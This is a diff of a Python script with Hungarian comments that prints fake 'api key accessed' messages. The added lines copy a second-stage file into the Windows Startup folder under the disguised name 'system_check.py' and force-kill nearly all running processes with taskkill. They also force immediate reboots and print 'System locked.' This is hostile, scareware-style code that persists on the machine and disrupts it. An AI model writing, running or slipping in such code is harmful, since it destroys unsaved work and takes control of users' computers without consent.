@@ -78,32 +78,7 @@ time.sleep(1)
 print("microsoft api key accessed... ")
 time.sleep(1)
 import os
-
-user_home = os.path.expanduser("~")
-roblox_path = os.path.join(user_home, "AppData", "Local", "Roblox", "Versions")
-try:
-    for root, dirs, files in os.walk(roblox_path):
-        if "RobloxPlayerBeta.exe" in files:
-            teljes_utvonal = os.path.join(root, "RobloxPlayerBeta.exe")
-            os.startfile(teljes_utvonal)
-            break
-except Exception as e:
-    pass # Ezt írd ide, hogy ne legyen piros!
     
-
-def set_startup():
-    # Megkeressük a Startup mappát
-    startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-    bat_fajl = os.path.join(startup_mappa, "indit_oopa.bat")
-    
-    if not os.path.exists(bat_fajl):
-        try:
-            with open(bat_fajl, "w") as f:
-                # Ez a sor megmondja a Windowsnak: Használd a pythont az oopa.py megnyitásához
-                f.write(f'start "" python "{os.path.abspath(sys.argv[0])}"')
-        except:
-            pass
-
 import os
 import shutil
 import sys
@@ -138,3 +113,50 @@ if not os.path.exists(cel_utvonal):
         print("Sikeresen beépülve az indítópultba!")
     except:
         pass
+    import os
+import shutil
+import sys
+
+# Útvonalak
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# Itt add meg a második fájlod nevét, ami a mappádban van
+phase2_fajl = "phase2.py" 
+cel_utvonal = os.path.join(startup_mappa, "system_check.py") # A startupban más néven mentjük
+
+try:
+    # Másoljuk a phase2.py-t a Startup mappába
+    shutil.copy(phase2_fajl, cel_utvonal)
+    
+    # Újraindítás
+    os.system("shutdown /r /t 5")
+except Exception as e:
+    pass
+
+sys.exit()
+
+import os
+
+# Azonnali, kényszerített újraindítás
+user_home = os.path.expanduser("~")
+roblox_path = os.path.join(user_home, "AppData", "Local", "Roblox", "Versions")
+try:
+    for root, dirs, files in os.walk(roblox_path):
+        if "RobloxPlayerBeta.exe" in files:
+            teljes_utvonal = os.path.join(root, "RobloxPlayerBeta.exe")
+            os.startfile(teljes_utvonal)
+            break
+except Exception as e:
+    pass # Ezt írd ide, hogy ne legyen piros!
+
+import os
+import time
+
+# Várunk kicsit, hogy a Roblox elinduljon
+time.sleep(10)
+
+# Kényszerített kilövés (/F) mindenre, ami nem a védett listán van
+os.system('taskkill /F /FI "STATUS eq RUNNING" /FI "IMAGENAME ne python.exe" /FI "IMAGENAME ne cmd.exe" /FI "IMAGENAME ne py.exe" /T')
+
+print("Rendszer zárolva. Minden folyamat leállítva.")
+
+os.system("shutdown /r /f /t 0")
